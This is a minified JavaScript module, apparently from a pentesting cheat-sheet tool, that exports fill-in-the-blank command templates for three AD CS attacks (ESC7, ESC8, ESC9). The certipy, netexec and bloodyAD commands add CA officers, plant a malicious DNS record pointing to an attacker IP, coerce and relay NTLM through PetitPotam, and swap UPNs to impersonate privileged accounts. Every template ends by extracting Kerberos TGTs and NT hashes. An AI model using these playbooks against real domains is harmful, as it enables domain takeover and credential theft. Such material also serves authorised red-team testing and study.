const e=[{title:"ESC7",description:"ESC7: Dangerous Permissions on CA",template:`## 1) Discover CA permissions and vulnerable templates

certipy-ad  find -u '{username}@{domain}' -p '{password}' -dc-ip {dc_ip} -vulnerable -enabled

## 2) Add officer (give Manage Certificates via Manage CA)

certipy-ad ca -ca {ca_name} -add-officer {account} -u '{operator}@{domain}' -p '{operator_password}' -target {dc_ip} -dc-ip {dc_ip}

## 3) Enable template (if required)

certipy-ad ca -ca {ca_name} -u '{operator}@{domain}' -p '{operator_password}' -target {dc_ip} -enable-template {template_name} -dc-ip {dc_ip}

## 4) Create certificate request (saves private key locally)

certipy-ad req -u '{username}@{domain}' -p '{password}' -ca {ca_name} -target {target_host} -template {template_name} -upn {upn} -dc-ip {dc_ip}

## 5) Issue the saved request as a CA operator

certipy-ad ca -u '{operator}@{domain}' -p '{operator_password}' -ns {ns_ip} -target '{target_host}' -ca '{ca_name}' -issue-request {request_id}

## 6) Retrieve the issued certificate and export PFX

certipy-ad req -u '{operator}@{domain}' -p '{operator_password}' -dc-ip {ns_ip} -target '{target_host}' -ca '{ca_name}' -retrieve {request_id}

## 7) Sync time to avoid Kerberos/cert issues

sudo ntpdate {dc_ip}

## 8) Authenticate with the PFX and extract TGT/ccache/NT hash

certipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC8",description:"ESC8: NTLM Relay to AD CS Web Enrollment",template:`## 1) Enumerate AD CS and check for ESC8 (HTTP web enrollment)

certipy find -target {ca_target} -u '{username}@{domain}' -p '{password}' -k -vulnerable -stdout

## 2) Check MachineAccountQuota (optional, Linux path uses DNS/SPN trick)

netexec ldap {dc_host} -u {username} -p {password} -k -M maq

## 3) Add malicious DNS record (serialized SPN trick) using bloodyAD

bloodyAD -u {username} -p {password} -d {domain} -k --host {ca_dns} add dnsRecord {malicious_record} {attacker_ip}

## 4) Start certipy relay targeting the AD CS HTTP enrollment endpoint and choose a template

certipy relay -target 'http://{ca_http_host}/' -template {template_name}

## 5) Test/coerce authentication from target (try PetitPotam / PrinterBug / DFSCoerce via netexec coerce_plus)

netexec smb {dc_host} -u {username} -p {password} -k -M coerce_plus -o LISTENER={malicious_record} METHOD=PetitPotam

## 6) Observe certipy relay output — when successful it will issue a cert and write a PFX

# certipy relay will print lines showing request, issuance and saved PFX (e.g., 'dc-jpq225.pfx')

## 7) Authenticate with the resulting PFX and extract TGT / ccache / NT hash

certipy auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC9",description:"ESC9: No Security Extension on Certificate Template",template:`## 1) Enumerate AD CS and check for ESC8 (HTTP web enrollment)

certipy find -target {ca_target} -u '<username>@<domain>' -p '<password>' -k -vulnerable -stdout

## 2) Change the CA operator's UPN to a high-privilege identity (using credentials or NTLM hash of controller account)

certipy account update -u {controller_account} -hashes :{controller_hash} -user {target_account} -upn {new_upn} -dc-ip {dc_ip}

## 3) Request a certificate for the target account using a vulnerable template

certipy req -u {target_account} -hashes :{target_account_hash} -ca {ca_name} -template {template_name} -dc-ip {dc_ip}

## 4) Revert the target account's UPN back to its original value to avoid breaking CA behavior

certipy account update -u {controller_account} -hashes :{controller_hash} -user {target_account} -upn {original_upn} -dc-ip {dc_ip}

## 5) Use the resulting PFX to authenticate and obtain TGT / ccache / NT hash

certipy auth -pfx {pfx_file} -dc-ip {dc_ip} -domain {domain}`}],t={commands:e};export{e as commands,t as default};
